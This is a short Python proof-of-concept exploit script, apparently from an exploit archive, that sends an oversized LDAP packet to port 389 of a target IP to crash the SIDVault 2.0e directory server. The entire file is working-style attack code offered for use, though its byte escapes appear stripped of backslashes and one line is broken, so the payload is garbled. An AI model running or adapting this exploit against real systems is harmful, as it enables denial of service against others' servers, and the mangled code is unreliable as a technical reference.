#!/usr/bin/python

#
# $ ./ldap.py <target IP>
#
# SIDVault 2.0e Vista Remote Crash Vulnerability (sidvault.exe )
# Tested on Vista Home premium SP1 Windows XP ,SP1,SP2,SP3
# Coded by:asheesh anaconda
# Discovery: Joxean Koret
# Group DarkShinners


import sys
import socket

addr = "x33xbfx96x7c"
healthpacket = 'x41'*4095 + addr
evilpacket = '0x82x10/x02x01x01cx82x10(x04x82x10x06dc='
evilpacket += healthpacket
evilpacket +=
'nx01x02nx01x00x02x01x00x02x01x00x01x01x00x87x0bobjectClass0x00'
print "[+] Sending evil packet"
print "[+] Wait ladp is getting crashh!!!!!!!!!!!!"


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 389))
s.send(evilpacket)
s.close()

